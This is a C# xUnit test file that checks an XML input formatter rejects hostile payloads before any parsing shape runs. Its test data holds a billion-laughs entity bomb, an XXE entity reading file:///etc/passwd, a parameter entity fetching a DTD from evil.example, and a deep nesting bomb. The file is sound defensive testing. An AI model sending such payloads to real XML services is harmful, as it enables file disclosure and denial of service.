using System.Globalization;
using System.Text;
using Norse.Infrastructure.Web.Server.Tests.Xml.FormatterFixtures;
using Norse.Infrastructure.Web.Server.Xml;

namespace Norse.Infrastructure.Web.Server.Tests.Xml;

/// <summary>
///     The security corpus (design spec §8.1, §15) — the actual point of Task 9. Every payload here must be
///     rejected session-fatal: exactly one <c>ModelState</c> error, and — the critical, spy-verified part —
///     <see cref="SpyWidgetShape.Read" /> must never be invoked. None of these payloads may ever "resolve"
///     (parse successfully with the dangerous content neutralized); they are rejected outright, before
///     <see cref="XmlContractInputFormatter" /> ever hands the shape a reader.
/// </summary>
public sealed class SecurityCorpusTests
{
	[Theory]
	[MemberData(nameof(SessionFatalPayloads))]
	async Task Every_session_fatal_payload_is_rejected_before_the_shape_is_ever_invoked(string label, byte[] body)
	{
		var spy = new SpyWidgetShape();
		var registry = new XmlShapeRegistry();
		registry.Add(spy);
		var formatter =
			new XmlContractInputFormatter(registry, new NorseXmlOptions { CaseStyle = XmlCaseStyle.CamelCase });
		var context = FormatterTestSupport.BuildReadContext(body, typeof(Widget));

		var result = await formatter.ReadRequestBodyAsync(context, Encoding.UTF8);

		result.HasError.ShouldBeTrue(label);
		result.IsModelSet.ShouldBeFalse(label);
		context.ModelState.ErrorCount.ShouldBe(1, label);
		spy.ReadInvocations.ShouldBe(0, label);
	}

	public static TheoryData<string, byte[]> SessionFatalPayloads()
	{
		TheoryData<string, byte[]> data = new()
		{
			{ "plain DOCTYPE", Utf8("""<!DOCTYPE widget><widget name="x"/>""") },
			{
				"billion laughs (internal entity expansion)", Utf8("""
				<?xml version="1.0"?>
				<!DOCTYPE lolz [
				 <!ENTITY lol "lol">
				 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
				]>
				<widget name="&lol1;"/>
				""")
			},
			{
				"external entity (classic XXE)", Utf8("""
				<?xml version="1.0"?>
				<!DOCTYPE widget [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
				<widget name="&xxe;"/>
				""")
			},
			{
				"parameter entity", Utf8("""
				<?xml version="1.0"?>
				<!DOCTYPE widget [ <!ENTITY % pe SYSTEM "http://evil.example/pe.dtd"> %pe; ]>
				<widget name="x"/>
				""")
			},
			{ "33-deep nesting bomb", Utf8(ThirtyThreeDeepNestingBomb()) },
			{ "UTF-16 BOM payload", FormatterTestSupport.Utf16WithBom("""<widget name="x"/>""") },
			{
				"processing instruction payload",
				Utf8("""<?xml-stylesheet type="text/xsl" href="style.xsl"?><widget name="x"/>""")
			}
		};
		return data;
	}

	static string ThirtyThreeDeepNestingBomb()
	{
		StringBuilder sb = new();
		for (var i = 0; i < 33; i++)
			sb.Append(CultureInfo.InvariantCulture, $"<a{i}>");
		sb.Append('x');
		for (var i = 32; i >= 0; i--)
			sb.Append(CultureInfo.InvariantCulture, $"</a{i}>");
		return sb.ToString();
	}

	static byte[] Utf8(string xml) =>
		Encoding.UTF8.GetBytes(xml);
}
